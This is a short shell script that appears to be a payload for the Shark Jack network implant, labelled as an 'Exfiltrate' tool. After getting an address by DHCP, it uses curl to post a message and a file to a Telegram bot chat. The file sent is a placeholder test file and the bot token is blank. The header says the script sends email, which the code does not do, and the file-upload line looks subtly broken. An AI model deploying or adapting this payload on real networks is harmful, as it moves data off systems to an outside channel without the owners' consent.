#!/bin/sh
# Title:        Telegram
# Description:  Exfiltrate data with email
# Author:       Jules Bozouklian - bozou_client
# Version:      1.0
# Category:     Exfiltrate
#
# LED SETUP (Magenta)... Setting logs and waiting for IP address from DHCP
# LED ATTACK (Yellow)... Send email
#

LOG_DIR=/root/loot/exfiltrate/telegram
TIMESTAMP=`date +"%Y-%m-%d"`

TOKEN=""
CHANEL=""
MESSAGE="Log from Shark Jack"
API_URL="https://api.telegram.org/bot$TOKEN/sendMessage"
API_FILE_URL="https://api.telegram.org/bot$TOKEN/sendDocument"

LED SETUP

NETMODE DHCP_CLIENT

# Make log file
mkdir -p $LOG_DIR
LOG_FILE=$TIMESTAMP"_$(find $LOG_DIR -type f | wc -l).log"
LOG="$LOG_DIR/$LOG_FILE"

# Wait until Shark Jack has an IP address
while [ -z "$IPADDR" ]; do sleep 1 && IPADDR=$(ifconfig eth0 | grep "inet addr"); done

LED ATTACK

# create a fake file to send
touch /root/test-file.txt


function sendToTelegram() {
    curl -s -X POST $API_URL -d chat_id=$CHANEL -d text="$MESSAGE"
		curl -v -F "chat_id=$CHANEL" -F document=/root/test-file.txt $API_FILE_URL
}


sendToTelegram

LED FINISH
